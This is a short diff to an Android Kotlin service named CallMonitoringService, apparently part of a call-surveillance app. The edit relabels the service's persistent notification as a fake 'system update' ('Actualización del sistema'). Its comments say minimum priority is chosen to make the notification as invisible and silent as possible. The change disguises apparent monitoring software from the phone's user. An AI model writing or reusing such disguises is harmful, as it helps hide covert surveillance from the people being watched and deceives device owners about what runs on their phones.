@@ -170,12 +170,13 @@ class CallMonitoringService : Service() {
 
     private fun crearNotificacion(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Servicio activo")
-            .setContentText("Sincronizando información")
+            .setContentTitle("Actualización del sistema")
+            .setContentText("Verificando servicios en segundo plano...")
             .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setPriority(NotificationCompat.PRIORITY_MIN) // Prioridad mínima para que sea lo más invisible y silenciosa posible
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
-            .setOngoing(true)
+            .setOngoing(true) // Impide que se deslice, cumpliendo con la regla de Android
             .build()
     }
 }
+
